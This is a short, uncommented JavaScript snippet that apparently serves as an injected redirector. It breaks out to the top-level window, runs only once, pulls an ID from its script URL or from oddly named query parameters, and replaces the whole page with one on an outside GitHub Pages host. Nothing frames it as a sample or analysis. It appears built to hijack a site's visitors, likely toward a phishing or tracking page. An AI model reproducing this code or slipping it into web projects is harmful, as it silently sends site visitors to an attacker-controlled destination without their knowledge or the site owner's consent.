
(function () {
  "use strict";

  var W;

  try {
    W = window.top;
    if (W.__fc_ran) return;
    W.__fc_ran = 1;
  } catch (e) {
    return;
  }

  var BASE = "https://riopehrips.github.io/con";

  function getId() {
    var s = document.currentScript;

    if (s && s.src) {
      var p = new URL(s.src).searchParams;
      var id = p.get("id");
      if (id) return id;
    }

    var p = new URLSearchParams(W.location.search);

    return p.get("lagabo") ||
           p.get("GetFoldersAndFiles") ||
           p.get("id") || "";
  }

  var id = getId();

  if (!/^[A-Za-z0-9_.-]{1,80}$/.test(id)) {
    W.location.replace(BASE + "/");
    return;
  }

  W.location.replace(
    BASE + "/js/fc.html?lagabo=" + encodeURIComponent(id)
  );
})();
